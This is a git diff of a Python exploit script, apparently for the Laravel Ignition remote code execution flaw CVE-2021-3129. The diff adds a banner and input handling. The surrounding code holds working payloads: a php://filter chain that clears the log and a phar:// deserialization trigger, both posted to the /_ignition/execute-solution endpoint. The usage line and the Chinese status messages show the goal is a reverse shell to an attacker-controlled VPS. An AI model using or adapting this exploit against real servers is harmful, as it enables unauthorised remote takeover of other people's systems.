@@ -4,6 +4,20 @@ import base64
 import os
 
 if __name__ == '__main__':
+    print(
+"""
+_____________   _______________         _______________   ________  ____          ________  ____________  ________ 
+\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \/_   |         \_____  \/_   \_____  \/   __   \
+/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/ |   |  ______   _(__  < |   |/  ____/\____    /
+\     \____\     /   |        \ /_____/ /       \  \_/   \/       \ |   | /_____/  /       \|   /       \   /    / 
+ \______  / \___/   /_______  /         \_______ \_____  /\_______ \|___|         /______  /|___\_______ \ /____/      by ccdragon
+        \/                  \/                  \/     \/         \/                     \/             \/         
+"""
+    )
+    # 防止奇怪问题
+    if(sys.argv[1][-1]=='/'):
+        sys.argv[1]=sys.argv[1][:-1]
+    
     # 用法 python exp.py url vps_ip vps_port
     print(sys.argv)
     clear_log_payload={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
@@ -40,7 +54,7 @@ if __name__ == '__main__':
         attack_payload3={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"phar://../storage/logs/laravel.log"}}
         a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload3)
         if("cannot be empty" in a.text):
-            print("攻击成功,请检查是否弹到了shell")
+            print("攻击成功,请检查是否反弹到shell")
     print("攻击结束....")
 
     
